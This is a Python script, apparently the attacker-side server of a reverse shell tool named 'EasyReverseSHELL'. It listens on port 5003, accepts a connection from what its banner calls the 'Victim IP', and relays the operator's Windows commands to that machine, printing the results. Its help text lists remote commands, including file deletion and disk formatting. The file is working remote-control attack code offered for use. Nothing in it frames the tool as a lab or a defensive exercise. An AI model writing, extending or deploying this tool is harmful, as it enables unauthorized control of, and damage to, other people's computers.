import socket
import sys

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"
s = socket.socket()

VERSION = "v1.3"
CPT = 0

s.bind((SERVER_HOST, SERVER_PORT))

s.listen(5)
print(f"[+] Listening as {SERVER_HOST}:{SERVER_PORT} ...")

client_socket, client_address = s.accept()

cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[!] Connecting to client ...")

print("""
    ▄▄▄ . ▄▄▄· .▄▄ ·  ▄· ▄▌▄▄▄  ▄▄▄ . ▌ ▐·▄▄▄ .▄▄▄  .▄▄ · ▄▄▄ ..▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  
    ▀▄.▀·▐█ ▀█ ▐█ ▀. ▐█▪██▌▀▄ █·▀▄.▀·▪█·█▌▀▄.▀·▀▄ █·▐█ ▀. ▀▄.▀·▐█ ▀. ██▪▐█▀▄.▀·██•  ██•  
    ▐▀▀▪▄▄█▀▀█ ▄▀▀▀█▄▐█▌▐█▪▐▀▀▄ ▐▀▀▪▄▐█▐█•▐▀▀▪▄▐▀▀▄ ▄▀▀▀█▄▐▀▀▪▄▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪  
    ▐█▄▄▌▐█ ▪▐▌▐█▄▪▐█ ▐█▀·.▐█•█▌▐█▄▄▌ ███ ▐█▄▄▌▐█•█▌▐█▄▪▐█▐█▄▄▌▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌
    ▀▀▀  ▀  ▀  ▀▀▀▀   ▀ • .▀  ▀ ▀▀▀ . ▀   ▀▀▀ .▀  ▀ ▀▀▀▀  ▀▀▀  ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀ 
    ┏ Made by hugowwz on Instagram
    ┣ Version : """ + VERSION + """
    ┣ """ + "Current working directory:", cwd + """
    ┣ """ + f"Victim IP : {client_address[0]} (Port used :{client_address[1]})" + """
    ┗ Commands info :
        ┳ "quit" or "exit" to exit
        ┣ "shell" to access the command prompt
        ┣ "screenshot" to take a screenshot
        ┣ "help" to view all commands
        ┗ Do not enter "cmd", "powershell" or similar commands as they don't work !
""")

while True:
    result = input("EasyReverseSHELL > ")

    if result == "exit":
        break

    if result == "quit":
        break

    if result == "screenshot":
        print("The Screenshot option is currently under development.")

    if result == "help":
        print("""
    Commands info :
        ┳ "quit" or "exit" to exit
        ┣ "shell" : Access the command prompt
        ┃   ┳ "assoc" : Displays or modifies file extension associations.
        ┃   ┣ "attrib" : Displays or changes file attributes.
        ┃   ┣ "cd" : Changes the current directory.
        ┃   ┣ "chcp" : Displays or sets the active code page.
        ┃   ┣ "chkdsk" : Checks a disk for errors and attempts to repair them.
        ┃   ┣ "cls" : Clears the screen.
        ┃   ┣ "copy" : Copies one or more files to another location.
        ┃   ┣ "del" : Deletes one or more files.
        ┃   ┣ "dir" : Displays a list of files and subdirectories in a directory.
        ┃   ┣ "echo" : Displays messages or turns command echoing on or off.
        ┃   ┣ "exit" : Exits the Command Prompt.
        ┃   ┣ "find" : Searches for a text string in files.
        ┃   ┣ "format" : Formats a disk for use with Windows.
        ┃   ┣ "help" : Provides help information for Windows commands.
        ┃   ┣ "ipconfig" : Displays the IP configuration for all network interfaces.
        ┃   ┣ "md" : Creates a new directory.
        ┃   ┣ "move" : Moves one or more files from one directory to another.
        ┃   ┣ "ping" : Sends network requests to a specific IP address to check connectivity.
        ┃   ┣ "rd" : Removes a directory.
        ┃   ┣ "ren" : Renames a file or directory.
        ┃   ┣ "rmdir" : Removes a directory.
        ┃   ┣ "tasklist" : Displays a list of currently running processes.
        ┃   ┣ "taskkill" : Terminates one or more running processes.
        ┃   ┣ "time" : Displays or sets the system time.
        ┃   ┣ "title" : Sets the Command Prompt window title.
        ┃   ┣ "type" : Displays the contents of a text file.
        ┃   ┣ "ver" : Displays the Windows version.
        ┃   ┣ "vol" : Displays the volume label and serial number of a disk drive.
        ┃   ┣ "xcopy" : Copies files and directories, including subdirectories.
        ┃   ┣ "wmic" : Displays WMI (Windows Management Instrumentation) information.
        ┃   ┣ Please note that this list is not exhaustive, and there are many more commands available in
        ┃   ┃ the Windows Command Prompt. You can access detailed help for any command by typing the command
        ┃   ┃ followed by "/?" (e.g., "command /?").
        ┃
        ┣ "screenshot" to take a screenshot
        ┣ "help" to view all commands
        ┗ Do not enter "cmd", "powershell" or similar commands as they don't work !
        """)
    
    if result == "shell":

        if CPT == 1:
                print("Unable to connect to shell")

        if CPT == 0:
            while True:
                yn_shell = input("Warning! You can only use the shell once. Are you sure you want to connect to it (y/n)? ")

                if yn_shell == "y":
                    CPT = CPT + 1
                    while True:
                        command = input("EasyReverseSHELL "f"{cwd}> ")
                        if not command.strip():
                            continue

                        client_socket.send(command.encode())

                        if command.lower() == "exit":
                            break

                        if command.lower() == "quit":
                            break

                        output = client_socket.recv(BUFFER_SIZE).decode()
                        results, cwd = output.split(SEPARATOR)
                        print(results)
                    
                    break

                if yn_shell == "n":
                    print("You have not been connected to the shell.")
                    break

                else:
                    print("Please rewrite the text correctly.")

